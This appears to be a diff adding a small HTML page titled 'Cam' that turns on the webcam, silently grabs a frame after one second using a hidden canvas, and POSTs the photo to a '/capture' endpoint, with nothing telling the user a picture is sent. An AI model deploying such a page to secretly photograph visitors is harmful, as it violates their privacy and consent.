@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cam</title>
+</head>
+<body>
+    <video id="video" width="400" height="300" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        // Включаем камеру
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => video.srcObject = stream)
+            .catch(err => console.log(err));
+        
+        // Делаем снимок через секунду
+        video.addEventListener('play', () => {
+            setTimeout(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Отправляем фото
+                fetch('/capture', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        photo: canvas.toDataURL('image/jpeg')
+                    })
+                });
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
